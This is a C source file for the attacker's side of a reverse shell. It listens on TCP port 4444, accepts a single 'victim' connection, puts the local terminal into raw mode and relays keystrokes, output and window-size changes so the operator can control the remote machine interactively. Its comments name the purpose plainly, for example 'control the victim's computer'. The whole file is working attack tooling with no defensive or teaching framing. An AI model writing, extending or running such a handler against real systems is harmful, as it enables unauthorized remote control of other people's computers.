#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/poll.h>
#include <sys/errno.h>
#include <sys/termios.h>
#include <sys/signal.h>
#include <sys/ioctl.h>

#if defined(__linux__) || defined(__MSYS__)
    #include <pty.h>
#elif defined(__APPLE__)
    #include <util.h>
#endif

#define SERVER_PORT 4444

typedef struct sockaddr_in sockaddr_in;
typedef struct sockaddr sockaddr;
typedef struct pollfd pollfd;
typedef struct termios termios;
typedef struct winsize winsize;

volatile sig_atomic_t is_resize_needed = false;

void handle_sigwinch(int signal)
{
    is_resize_needed = true;
}

void enable_raw_mode(termios *original)
{
    // Store the terminal attributes for
    // raw mode
    termios raw;

    // Get original terminal attributes
    // and save them
    if (tcgetattr(STDIN_FILENO, original) == -1)
    {
        perror("tcgetattr");
        exit(EXIT_FAILURE);
    }

    // Copy the original terminal attributes
    // to raw
    raw = *original;

    // Now we will change the terminal to raw mode
    cfmakeraw(&raw);
    if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == -1)
    {
        perror("tcsetattr");
        exit(EXIT_FAILURE);
    }
}

void disable_raw_mode(termios *original)
{
    // Restore terminal back to canonical mode
    if (tcsetattr(STDIN_FILENO, TCSANOW, original) == -1)
    {
        perror("tcsetattr");
        exit(EXIT_FAILURE);
    }
}

void send_window_size(int client_fd)
{
    // Struct to hold properties of the socket
    winsize ws;

    // This marker indicates that we need to update
    // the window size. The attacker will send this
    // marker byte to the victim if the attacker's
    // window size changes
    uint8_t marker = 0xFF;

    // Read the new window size and save the settings
    if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == -1) return;

    // Send the marker indicating a window size change
    // to the victim along with the new window settings
    write(client_fd, &marker, 1);
    write(client_fd, &ws, sizeof(ws));
}

void monitor_fd(int client_fd)
{
    // Buffer to temporarily store the
    // data before sending over the network
    char buffer[4096];

    // Create an array of file descriptors
    // that will be used for waiting for
    // input and output
    pollfd fds[2];
    nfds_t ndfs = 2;

    // Store the amount of data read
    // from the socket (not the data itself)
    ssize_t bytes_read;

    // Initialize the file descriptors
    // POLLIN = waiting for input
    
    // STDIN FD
    fds[0].fd = STDIN_FILENO;
    fds[0].events = POLLIN;

    // Client FD
    fds[1].fd = client_fd;
    fds[1].events = POLLIN;

    // Send new window size to the victim
    send_window_size(client_fd);

    // Keep looping until the attacker
    // ends the session or the connection
    // gets lost
    while (true)
    {
        // Waiting for an event from the
        // file descriptors
        if (poll(fds, ndfs, -1) < 0)
        {
            // Check for any interrupts
            // from the OS and ignore them
            if (errno == EINTR) continue;
            perror("poll");
            break;
        }

        // Check if we need to update the
        // window size and send the new window
        // size to the victim if needed
        if (is_resize_needed)
        {
            is_resize_needed = false;
            send_window_size(client_fd);
        }

        // This is the main flow of the program
        //
        // Here we will monitor for any I/O
        // events from the file descriptors

        // STDIN -> Client
        if (fds[0].revents & (POLLIN | POLLHUP))
        {
            // Read data from the keyboard
            bytes_read = read(STDIN_FILENO, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Send data to the victim and exit
            // if we couldn't send a command to the victim
            if (write(client_fd, buffer, (size_t)bytes_read) < 0) break;
        }

        // Client -> STDIN
        if (fds[1].revents & (POLLIN | POLLHUP))
        {
            // Read data from the attacker
            bytes_read = read(client_fd, buffer, sizeof(buffer));

            // Check if we didn't read anything
            // and exit if nothing is read
            if (bytes_read <= 0) break;

            // Send data to the attacker and exit
            // if we couldn't send a command to the victim
            if (write(STDIN_FILENO, buffer, (size_t)bytes_read) < 0) break;
        }

        // Check for any error events
        if (fds[0].revents & (POLLERR | POLLNVAL)) break;
        if (fds[1].revents & (POLLERR | POLLNVAL)) break;
    }
}

void listen_to_victim(void)
{
    // We will use two sockets for the server
    //
    // A server socket used for listening to
    // the victim
    //
    // and a client socket used for communicating
    // to the victim
    int client_fd, server_fd;

    // Struct to hold properties of the socket
    sockaddr_in sa;

    // Store original terminal attributes
    termios original;

    // Define properties of the socket
    // Use IPv4 for network communication
    sa.sin_family = AF_INET;

    // Convert string representation of
    // IP to an actual number
    sa.sin_addr.s_addr = INADDR_ANY;

    // Change the byte order of the integer
    // to network byte order
    sa.sin_port = htons(SERVER_PORT);

    // Create the socket that will be used
    // to communicate over the network
    // AF_INET -> Use IPv4
    // SOCK_STREAM -> Use connection oriented socket (TCP) (reliable byte stream)
    // IPPROTO_TCP -> Use TCP protocol
    server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_fd < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // Since this is the server, we need to bind
    // the socket to our system's IP address
    if (bind(server_fd, (sockaddr*)&sa, sizeof(sa)) < 0)
    {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    // Listen for a connection from
    // the victim
    //
    // Only allow 1 connection and drop
    // any other connections afterwards
    if (listen(server_fd, 1) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    // Now we accept the incoming connection
    // from the victim
    client_fd = accept(server_fd, NULL, NULL);
    if (client_fd < 0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    // From here, we monitor the file
    // descriptors and control the victim's
    // computer

    // Check for window change signals
    // from the OS
    signal(SIGWINCH, handle_sigwinch);

    // Set the terminal to raw mode
    enable_raw_mode(&original);

    // Monitor the Client FD, which is
    // used to control the victim's
    // computer
    monitor_fd(client_fd);

    // Set the terminal back to
    // canonical mode
    disable_raw_mode(&original);

    // Once we are done, close the sockets
    close(client_fd);
    close(server_fd);
}

int main(void)
{
    listen_to_victim();
    return 0;
}
